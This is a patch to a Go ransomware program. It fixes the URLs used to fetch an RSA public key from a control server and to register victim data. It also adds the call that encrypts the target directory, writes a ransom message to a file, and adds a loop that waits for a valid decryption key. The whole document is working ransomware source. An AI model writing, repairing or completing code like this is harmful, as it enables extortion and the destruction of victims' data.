@@ -173,7 +173,7 @@ func main() {
 
 	// Get block data from the server, this way the ransomware can run independently
 	// without needing the public key with the file.
-	resp, err := http.Get("127.0.0.1:8080/pubkey")
+	resp, err := http.Get("http://localhost:8080/pubkey")
 	if err != nil {
 		log.Fatalf("error getting rsa pubkey from server: %s", err)
 	}
@@ -188,7 +188,7 @@ func main() {
 		log.Fatal("bad key data: not PEM-encoded")
 	}
 
-	if got, want := block.Type, "RSA PUBLIC KEY"; got != want {
+	if got, want := block.Type, "PUBLIC KEY"; got != want {
 		log.Fatalf("unknown key type: %q, want %q", got, want)
 	}
 
@@ -202,6 +202,7 @@ func main() {
 		log.Fatalf("error while encrypting key content: %s", err)
 	}
 
+	ransomware.encryptDirectory(ransomware.rootDir)
 	if err := ioutil.WriteFile(ransomware.rootDir+"/key.txt", out, 0600); err != nil {
 		log.Fatalf("write output: %s", err)
 	}
@@ -221,13 +222,17 @@ func main() {
 		log.Fatalf("error marshaling victim data: %s", err)
 	}
 
-	resp, err = http.Post("127.0.0.1:8080/register", "application/json", bytes.NewBuffer(reqBody))
+	resp, err = http.Post("http://localhost:8080/register", "application/json", bytes.NewBuffer(reqBody))
 	if err != nil {
 		log.Fatalf("error sending victim register request: %s", err)
 	}
 
 	if resp.StatusCode != 200 {
 		log.Fatal("wrong response status code, stopping...")
+	}
+
+	if _, err := file.WriteString(message); err != nil {
+		log.Fatal(err)
 	}
 
 	// Setup a infinite loop, which checks the valid key.
@@ -246,6 +251,7 @@ func main() {
 			fmt.Println("Thank you for your cooperation!")
 			break
 		}
+		fmt.Println("Key did not match, checking again in 3 minutes...")
 
 		time.Sleep(time.Minute * 3)
 	}
